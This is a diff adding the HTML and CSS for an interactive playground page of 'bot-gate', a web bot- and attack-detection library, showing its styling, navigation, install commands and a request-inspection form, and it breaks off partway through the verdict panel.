@@ -1,0 +1,1924 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>bot-gate Playground · Pre-flight Bot &amp; Attack Detection Gate</title>
+  <meta name="description" content="Interactive playground for bot-gate: ultra-low-latency bot and attack detection with zero required dependencies, wire-order sequence validation, and TypeSafe System One acceleration.">
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    /* ==========================================================================
+       PASTEL THEME & TASTE DESIGN TOKENS
+       High contrast text on soft pastel surfaces. Ink on paper clarity.
+       ========================================================================== */
+    :root {
+      --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --font-mono: 'Geist Mono', 'SF Mono', 'JetBrains Mono', monospace;
+
+      /* Pastel Palette */
+      --canvas-bg: #f8f7f4;
+      --card-bg: #ffffff;
+      --card-border: #e8e6df;
+      --text-main: #14171a;
+      --text-muted: #5e6672;
+      --text-subtle: #8993a4;
+
+      /* Pastel Allow (Mint / Sage) */
+      --pastel-allow-bg: #edf7f2;
+      --pastel-allow-border: #c2e2d0;
+      --pastel-allow-text: #175432;
+      --pastel-allow-badge-bg: #d7efe1;
+      --pastel-allow-accent: #2e7d32;
+
+      /* Pastel Challenge / Warn (Buttercup / Honey Amber) */
+      --pastel-warn-bg: #fef7ec;
+      --pastel-warn-border: #f8dfbe;
+      --pastel-warn-text: #8c4c00;
+      --pastel-warn-badge-bg: #faebd2;
+      --pastel-warn-accent: #d97706;
+
+      /* Pastel Tarpit (Peach Orange) */
+      --pastel-tarpit-bg: #fff5eb;
+      --pastel-tarpit-border: #fed7aa;
+      --pastel-tarpit-text: #9a3412;
+      --pastel-tarpit-badge-bg: #ffedd5;
+      --pastel-tarpit-accent: #ea580c;
+
+      /* Pastel Block (Blush Coral / Soft Rose) */
+      --pastel-block-bg: #fdf1f0;
+      --pastel-block-border: #fac9c5;
+      --pastel-block-text: #9b201a;
+      --pastel-block-badge-bg: #f8d7d4;
+      --pastel-block-accent: #dc2626;
+
+      /* Pastel Neutral Accent */
+      --pastel-neutral-bg: #f3f4fa;
+      --pastel-neutral-border: #dadceb;
+      --pastel-neutral-text: #374151;
+
+      /* Corner Radii System */
+      --radius-sm: 8px;
+      --radius-md: 14px;
+      --radius-lg: 20px;
+      --radius-xl: 26px;
+      --radius-full: 9999px;
+
+      --shadow-sm: 0 1px 2px rgba(15, 23, 42, 0.04);
+      --shadow-card: 0 6px 20px -6px rgba(15, 23, 42, 0.06), 0 1px 3px rgba(15, 23, 42, 0.03);
+      --shadow-hover: 0 14px 32px -8px rgba(15, 23, 42, 0.1), 0 2px 4px rgba(15, 23, 42, 0.03);
+      --shadow-pill: 0 4px 14px -3px rgba(15, 23, 42, 0.08);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--canvas-bg);
+      color: var(--text-main);
+      font-family: var(--font-sans);
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+
+    /* Subtle fine-grain texture overlay */
+    .noise-bg {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 9999;
+      opacity: 0.025;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+    }
+
+    /* ==========================================================================
+       TOP NAVIGATION BAR
+       ========================================================================== */
+    .top-nav {
+      position: sticky;
+      top: 12px;
+      z-index: 100;
+      max-width: 1240px;
+      margin: 0 auto;
+      padding: 0 16px;
+    }
+
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      background: rgba(255, 255, 255, 0.90);
+      backdrop-filter: blur(14px);
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-full);
+      padding: 8px 18px;
+      box-shadow: var(--shadow-sm);
+    }
+
+    .brand-link {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      color: var(--text-main);
+      font-weight: 700;
+      font-size: 16px;
+      letter-spacing: -0.02em;
+    }
+
+    .brand-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 28px;
+      height: 28px;
+      background: #151515;
+      color: #ffffff;
+      border-radius: var(--radius-sm);
+      font-family: var(--font-mono);
+      font-size: 12px;
+      font-weight: 700;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .nav-link {
+      text-decoration: none;
+      color: var(--text-muted);
+      font-size: 13px;
+      font-weight: 500;
+      padding: 6px 14px;
+      border-radius: var(--radius-full);
+      transition: all 0.2s ease;
+    }
+
+    .nav-link:hover {
+      color: var(--text-main);
+      background: var(--pastel-neutral-bg);
+    }
+
+    .nav-btn-gh {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #18181b;
+      color: #ffffff;
+      text-decoration: none;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 6px 14px;
+      border-radius: var(--radius-full);
+      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
+    }
+
+    .nav-btn-gh:hover {
+      background: #27272a;
+      transform: translateY(-1px);
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.18);
+    }
+
+    /* ==========================================================================
+       HERO SECTION
+       ========================================================================== */
+    .hero-section {
+      max-width: 1240px;
+      margin: 36px auto 28px;
+      padding: 0 20px;
+      text-align: center;
+    }
+
+    .hero-eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--pastel-allow-bg);
+      border: 1px solid var(--pastel-allow-border);
+      color: var(--pastel-allow-text);
+      font-size: 12px;
+      font-weight: 600;
+      padding: 5px 14px;
+      border-radius: var(--radius-full);
+      margin-bottom: 16px;
+    }
+
+    .hero-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--pastel-allow-accent);
+      box-shadow: 0 0 0 2px rgba(46, 125, 50, 0.2);
+    }
+
+    .hero-title {
+      font-size: clamp(32px, 5vw, 54px);
+      font-weight: 700;
+      line-height: 1.1;
+      letter-spacing: -0.035em;
+      color: var(--text-main);
+      max-width: 860px;
+      margin: 0 auto 14px;
+    }
+
+    .hero-title span {
+      color: #059669;
+      background: linear-gradient(180deg, #10b981 0%, #059669 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-subtitle {
+      font-size: clamp(15px, 2vw, 18px);
+      color: var(--text-muted);
+      max-width: 720px;
+      margin: 0 auto 24px;
+      line-height: 1.5;
+      letter-spacing: -0.01em;
+    }
+
+    .quick-cli-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-bottom: 28px;
+    }
+
+    .cli-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-full);
+      padding: 7px 16px;
+      font-family: var(--font-mono);
+      font-size: 13px;
+      color: var(--text-main);
+      box-shadow: var(--shadow-sm);
+    }
+
+    .cli-pill code {
+      color: #0f172a;
+      font-weight: 600;
+    }
+
+    .copy-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--text-subtle);
+      display: flex;
+      align-items: center;
+      padding: 4px;
+      border-radius: var(--radius-sm);
+      transition: all 0.2s ease;
+    }
+
+    .copy-btn:hover {
+      color: var(--text-main);
+      background: var(--pastel-neutral-bg);
+    }
+
+    /* Preset Selection Bar */
+    .presets-container {
+      max-width: 1040px;
+      margin: 0 auto 36px;
+      text-align: center;
+    }
+
+    .presets-label {
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--text-subtle);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 12px;
+    }
+
+    .preset-pills-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .preset-btn {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-full);
+      padding: 6px 14px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-main);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: var(--shadow-sm);
+    }
+
+    .preset-btn:hover {
+      border-color: #cbd5e1;
+      transform: translateY(-1px);
+      box-shadow: var(--shadow-pill);
+    }
+
+    .preset-btn.active {
+      border-color: #111827;
+      background: #18181b;
+      color: #ffffff;
+    }
+
+    .preset-tag {
+      font-size: 9.5px;
+      font-weight: 700;
+      padding: 2px 6px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .preset-tag.block {
+      background: var(--pastel-block-badge-bg);
+      color: var(--pastel-block-text);
+    }
+    .preset-tag.challenge {
+      background: var(--pastel-warn-badge-bg);
+      color: var(--pastel-warn-text);
+    }
+    .preset-tag.tarpit {
+      background: var(--pastel-tarpit-badge-bg);
+      color: var(--pastel-tarpit-text);
+    }
+    .preset-tag.allow {
+      background: var(--pastel-allow-badge-bg);
+      color: var(--pastel-allow-text);
+    }
+
+    /* ==========================================================================
+       MAIN WORKBENCH LAYOUT (Asymmetrical 2-Column Split)
+       ========================================================================== */
+    .workbench-grid {
+      max-width: 1240px;
+      margin: 0 auto 50px;
+      padding: 0 20px;
+      display: grid;
+      grid-template-columns: minmax(380px, 500px) minmax(0, 1fr);
+      gap: 24px;
+      align-items: start;
+    }
+
+    @media (max-width: 960px) {
+      .workbench-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-lg);
+      padding: 24px;
+      box-shadow: var(--shadow-card);
+      position: relative;
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 18px;
+    }
+
+    .card-title {
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: -0.01em;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* Input Fields */
+    .input-row {
+      display: grid;
+      grid-template-columns: 100px 1fr;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+
+    .input-group {
+      margin-bottom: 14px;
+    }
+
+    .input-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 5px;
+    }
+
+    .text-input, .select-input {
+      width: 100%;
+      padding: 9px 12px;
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      font-family: var(--font-mono);
+      font-size: 12.5px;
+      color: var(--text-main);
+      outline: none;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .text-input:focus, .select-input:focus {
+      border-color: #0f172a;
+      box-shadow: 0 0 0 3px rgba(15, 23, 42, 0.05);
+    }
+
+    .code-textarea {
+      width: 100%;
+      height: 140px;
+      padding: 10px 12px;
+      background: #fafaf9;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: #1e293b;
+      line-height: 1.45;
+      resize: vertical;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .code-textarea:focus {
+      border-color: #0f172a;
+    }
+
+    /* Toggles and controls */
+    .control-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      padding: 8px 0;
+      border-bottom: 1px solid #f1f0eb;
+    }
+
+    .control-label-wrap {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .control-title {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-main);
+    }
+
+    .control-hint {
+      font-size: 11px;
+      color: var(--text-subtle);
+    }
+
+    .toggle-check {
+      cursor: pointer;
+      width: 18px;
+      height: 18px;
+      accent-color: #0f172a;
+    }
+
+    .slider-input {
+      width: 120px;
+      accent-color: #0f172a;
+    }
+
+    /* Engine Options Accordion */
+    .engine-section {
+      margin-top: 16px;
+      padding-top: 14px;
+      border-top: 1px solid #f1f0eb;
+    }
+
+    .engine-toggle-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+
+    .toggle-switch {
+      display: inline-flex;
+      background: var(--pastel-neutral-bg);
+      border-radius: var(--radius-full);
+      padding: 3px;
+      cursor: pointer;
+    }
+
+    .toggle-opt {
+      padding: 4px 10px;
+      border-radius: var(--radius-full);
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-muted);
+      border: none;
+      background: none;
+      cursor: pointer;
+    }
+
+    .toggle-opt.active {
+      background: #ffffff;
+      color: var(--text-main);
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+    }
+
+    .eval-btn {
+      width: 100%;
+      background: #111827;
+      color: #ffffff;
+      border: none;
+      border-radius: var(--radius-md);
+      padding: 12px 18px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 6px 18px rgba(17, 24, 39, 0.15);
+      margin-top: 16px;
+    }
+
+    .eval-btn:hover {
+      background: #1f2937;
+      transform: translateY(-1px);
+      box-shadow: 0 10px 24px rgba(17, 24, 39, 0.22);
+    }
+
+    .eval-btn:active {
+      transform: scale(0.985);
+    }
+
+    /* ==========================================================================
+       RIGHT PANEL: VERDICT & INSPECTION CARD
+       ========================================================================== */
+    .verdict-banner {
+      border-radius: var(--radius-lg);
+      padding: 22px;
+      border: 1px solid var(--card-border);
+      transition: all 0.3s ease;
+      margin-bottom: 20px;
+    }
+
+    .verdict-banner.allow {
+      background: var(--pastel-allow-bg);
+      border-color: var(--pastel-allow-border);
+    }
+    .verdict-banner.challenge {
+      background: var(--pastel-warn-bg);
+      border-color: var(--pastel-warn-border);
+    }
+    .verdict-banner.tarpit {
+      background: var(--pastel-tarpit-bg);
+      border-color: var(--pastel-tarpit-border);
+    }
+    .verdict-banner.block {
+      background: var(--pastel-block-bg);
+      border-color: var(--pastel-block-border);
+    }
+
+    .verdict-top {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 16px;
+      margin-bottom: 12px;
+      flex-wrap: wrap;
+    }
+
+    .verdict-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-size: 13px;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: var(--radius-full);
+      letter-spacing: 0.04em;
+    }
+
+    .verdict-banner.allow .verdict-badge {
+      background: var(--pastel-allow-badge-bg);
+      color: var(--pastel-allow-text);
+    }
+    .verdict-banner.challenge .verdict-badge {
+      background: var(--pastel-warn-badge-bg);
+      color: var(--pastel-warn-text);
+    }
+    .verdict-banner.tarpit .verdict-badge {
+      background: var(--pastel-tarpit-badge-bg);
+      color: var(--pastel-tarpit-text);
+    }
+    .verdict-banner.block .verdict-badge {
+      background: var(--pastel-block-badge-bg);
+      color: var(--pastel-block-text);
+    }
+
+    .verdict-timing {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: var(--text-muted);
+      background: rgba(255, 255, 255, 0.6);
+      padding: 4px 10px;
+      border-radius: var(--radius-full);
+      border: 1px solid rgba(0, 0, 0, 0.05);
+    }
+
+    .verdict-heading {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--text-main);
+      margin-bottom: 4px;
+    }
+
+    .verdict-desc {
+      font-size: 13.5px;
+      color: var(--text-muted);
+      line-height: 1.4;
+    }
+
+    /* Risk Meter */
+    .meter-wrap {
+      margin: 18px 0;
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      padding: 14px;
+    }
+
+    .meter-label-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+    }
+
+    .meter-track {
+      height: 10px;
+      background: #f1f0eb;
+      border-radius: var(--radius-full);
+      overflow: hidden;
+      position: relative;
+    }
+
+    .meter-fill {
+      height: 100%;
+      width: 0%;
+      border-radius: var(--radius-full);
+      transition: width 0.4s cubic-bezier(0.16, 1, 0.3, 1), background-color 0.3s ease;
+    }
+
+    /* Reasons List */
+    .signals-card {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      padding: 16px;
+      margin-bottom: 18px;
+    }
+
+    .signals-title {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--text-subtle);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 10px;
+    }
+
+    .signal-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 12.5px;
+      color: var(--text-main);
+      padding: 6px 0;
+      border-bottom: 1px solid #f8f7f4;
+    }
+
+    .signal-item:last-child {
+      border-bottom: none;
+    }
+
+    .signal-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      margin-top: 6px;
+      flex-shrink: 0;
+    }
+
+    /* PoW Live Challenge Box */
+    .pow-box {
+      display: none;
+      background: var(--pastel-warn-bg);
+      border: 1px solid var(--pastel-warn-border);
+      border-radius: var(--radius-md);
+      padding: 16px;
+      margin-bottom: 18px;
+    }
+
+    .pow-box.active {
+      display: block;
+    }
+
+    .pow-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--pastel-warn-text);
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .pow-desc {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-bottom: 12px;
+    }
+
+    .pow-btn {
+      background: #18181b;
+      color: #ffffff;
+      border: none;
+      border-radius: var(--radius-sm);
+      padding: 6px 12px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .pow-btn:hover {
+      background: #27272a;
+    }
+
+    /* Details JSON */
+    .telemetry-details {
+      margin-top: 14px;
+    }
+
+    .telemetry-details summary {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      cursor: pointer;
+      padding: 4px 0;
+      user-select: none;
+    }
+
+    .json-pre {
+      background: #14171a;
+      color: #f8fafc;
+      padding: 12px 14px;
+      border-radius: var(--radius-md);
+      font-family: var(--font-mono);
+      font-size: 11.5px;
+      line-height: 1.45;
+      overflow-x: auto;
+      margin-top: 8px;
+    }
+
+    /* ==========================================================================
+       ARCHITECTURE / FLOW SECTION
+       ========================================================================== */
+    .flow-section {
+      max-width: 1240px;
+      margin: 40px auto 60px;
+      padding: 0 20px;
+    }
+
+    .section-head {
+      text-align: center;
+      max-width: 640px;
+      margin: 0 auto 32px;
+    }
+
+    .section-tag {
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--text-subtle);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 8px;
+    }
+
+    .section-title {
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      color: var(--text-main);
+      margin-bottom: 10px;
+    }
+
+    .section-subtitle {
+      font-size: 14.5px;
+      color: var(--text-muted);
+    }
+
+    .diagram-frame {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-lg);
+      padding: 24px;
+      box-shadow: var(--shadow-card);
+      overflow-x: auto;
+      text-align: center;
+    }
+
+    .diagram-frame img, .diagram-frame svg {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* ==========================================================================
+       BENCHMARKS & THREAT MATRIX
+       ========================================================================== */
+    .matrix-section {
+      max-width: 1240px;
+      margin: 0 auto 60px;
+      padding: 0 20px;
+    }
+
+    .table-card {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      box-shadow: var(--shadow-card);
+      margin-bottom: 30px;
+    }
+
+    .styled-table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 13px;
+    }
+
+    .styled-table th {
+      background: #fafaf9;
+      color: var(--text-muted);
+      font-weight: 600;
+      padding: 12px 16px;
+      border-bottom: 1px solid var(--card-border);
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .styled-table td {
+      padding: 14px 16px;
+      border-bottom: 1px solid #f1f0eb;
+      color: var(--text-main);
+    }
+
+    .styled-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .styled-table code {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      background: var(--pastel-neutral-bg);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+
+    /* ==========================================================================
+       FOOTER
+       ========================================================================== */
+    .site-footer {
+      border-top: 1px solid var(--card-border);
+      padding: 40px 20px;
+      text-align: center;
+      background: #ffffff;
+    }
+
+    .footer-inner {
+      max-width: 1240px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .footer-copy {
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+
+    .footer-links {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .footer-link {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 13px;
+      transition: color 0.2s ease;
+    }
+
+    .footer-link:hover {
+      color: var(--text-main);
+    }
+  </style>
+</head>
+<body>
+  <div class="noise-bg"></div>
+
+  <!-- ==================== TOP NAV ==================== -->
+  <header class="top-nav">
+    <div class="nav-inner">
+      <a href="#" class="brand-link">
+        <span class="brand-badge">BG</span>
+        <span>bot-gate</span>
+      </a>
+      <nav class="nav-links">
+        <a href="#playground" class="nav-link">Playground</a>
+        <a href="#flow" class="nav-link">Architecture</a>
+        <a href="#matrix" class="nav-link">Threat Matrix</a>
+        <a href="#benchmarks" class="nav-link">Benchmarks</a>
+        <a href="https://github.com/hemanth/bot-gate" target="_blank" rel="noopener" class="nav-btn-gh">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+          <span>GitHub</span>
+        </a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- ==================== HERO SECTION ==================== -->
+  <section class="hero-section">
+    <div class="hero-eyebrow">
+      <span class="hero-dot"></span>
+      <span>EMPIRICAL DEFENSE BENCHMARK · 100% CANONICAL ACCURACY</span>
+    </div>
+    <h1 class="hero-title">
+      Pre-flight bot and attack detection <span>gate for web traffic</span>
+    </h1>
+    <p class="hero-subtitle">
+      Zero required dependencies, deterministic wire-order analysis, stateless HMAC sliding-window velocity, and TypeSafe System One acceleration in under 30 µs.
+    </p>
+
+    <!-- Quick Install Pills -->
+    <div class="quick-cli-row">
+      <div class="cli-pill">
+        <span>npm</span>
+        <code>npm install bot-gate</code>
+        <button class="copy-btn" onclick="copySnippet('npm install bot-gate', this)" title="Copy command">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+        </button>
+      </div>
+      <div class="cli-pill">
+        <span>pip</span>
+        <code>pip install bot-gate</code>
+        <button class="copy-btn" onclick="copySnippet('pip install bot-gate', this)" title="Copy command">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- Presets Selector -->
+    <div class="presets-container">
+      <div class="presets-label">Load Golden Attack &amp; Traffic Presets</div>
+      <div class="preset-pills-wrap" id="presetButtons">
+        <!-- Preset pills will be injected via JS -->
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== WORKBENCH (PLAYGROUND) ==================== -->
+  <section class="workbench-grid" id="playground">
+    <!-- LEFT COLUMN: REQUEST CONFIG -->
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
+          <span>Incoming Request Telemetry</span>
+        </div>
+        <span style="font-size: 11px; font-family: var(--font-mono); color: var(--text-subtle);">Layer-7 Telemetry</span>
+      </div>
+
+      <div class="input-row">
+        <div>
+          <label class="input-label">Method</label>
+          <select id="reqMethod" class="select-input">
+            <option value="GET">GET</option>
+            <option value="POST">POST</option>
+            <option value="HEAD">HEAD</option>
+          </select>
+        </div>
+        <div>
+          <label class="input-label">Request Path &amp; Query</label>
+          <input type="text" id="reqPath" class="text-input" value="/api/catalog?category=books">
+        </div>
+      </div>
+
+      <div class="input-group">
+        <label class="input-label">Client IP Address</label>
+        <input type="text" id="reqIp" class="text-input" value="198.51.100.42">
+      </div>
+
+      <div class="input-group">
+        <label class="input-label">Wire HTTP Headers (One per line: Key: Value)</label>
+        <textarea id="reqHeaders" class="code-textarea" spellcheck="false"></textarea>
+      </div>
+
+      <!-- Controls & Toggles -->
+      <div class="control-row">
+        <div class="control-label-wrap">
+          <span class="control-title">Wire-Order Sequence Integrity</span>
+          <span class="control-hint">Chromium wire sequence vs disordered client hints</span>
+        </div>
+        <input type="checkbox" id="headerOrderAnomaly" class="toggle-check">
+      </div>
+
+      <div class="control-row">
+        <div class="control-label-wrap">
+          <span class="control-title">Allow Verified Good Bots</span>
+          <span class="control-hint">Pass Googlebot, Bingbot, Slackbot</span>
+        </div>
+        <input type="checkbox" id="allowGoodBots" class="toggle-check" checked>
+      </div>
+
+      <div class="control-row">
+        <div class="control-label-wrap">
+          <span class="control-title">Trigger Canary Honeypot Trap</span>
+          <span class="control-hint">Simulate bot following hidden spider URL</span>
+        </div>
+        <input type="checkbox" id="isHoneypot" class="toggle-check">
+      </div>
+
+      <div class="control-row">
+        <div class="control-label-wrap">
+          <span class="control-title">Sliding-Window Velocity</span>
+          <span class="control-hint" id="velocityHint">Requests in 10s window: 1</span>
+        </div>
+        <input type="range" id="rateCountSlider" class="slider-input" min="1" max="80" value="1" oninput="updateVelocityLabel(this.value)">
+      </div>
+
+      <div class="control-row">
+        <div class="control-label-wrap">
+          <span class="control-title">Enforcement Policy</span>
+          <span class="control-hint">Sensitivity threshold profile</span>
+        </div>
+        <select id="policyProfile" class="select-input" style="width: 120px;">
+          <option value="balanced" selected>Balanced</option>
+          <option value="strict">Strict</option>
+          <option value="permissive">Permissive</option>
+        </select>
+      </div>
+
+      <!-- Engine Selector -->
+      <div class="engine-section">
+        <div class="engine-toggle-row">
+          <div>
+            <div style="font-size: 12px; font-weight: 600;">Inspection Tier</div>
+            <div style="font-size: 11px; color: var(--text-subtle);">Local fast-path vs TypeSafe System One</div>
+          </div>
+          <div class="toggle-switch">
+            <button type="button" class="toggle-opt active" id="btnEngineZero" onclick="setEngine('zero')">Zero-Dep JS</button>
+            <button type="button" class="toggle-opt" id="btnEngineTypeSafe" onclick="setEngine('typesafe')">TypeSafe (Jev)</button>
+          </div>
+        </div>
+      </div>
+
+      <button class="eval-btn" onclick="runInspection()">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polygon points="10 8 16 12 10 16 10 8"></polygon></svg>
+        <span>Inspect Inbound Request</span>
+      </button>
+    </div>
+
+    <!-- RIGHT COLUMN: VERDICT & TELEMETRY -->
+    <div>
+      <!-- Dynamic Verdict Banner -->
+      <div class="verdict-banner allow" id="verdictBanner">
+        <div class="verdict-top">
+          <div class="verdict-badge" id="verdictBadge">
+            <span id="verdictActionText">ALLOW</span>
+          </div>
+          <div class="verdict-timing" id="verdictLatency">~28 µs (in-tree)</div>
+        </div>
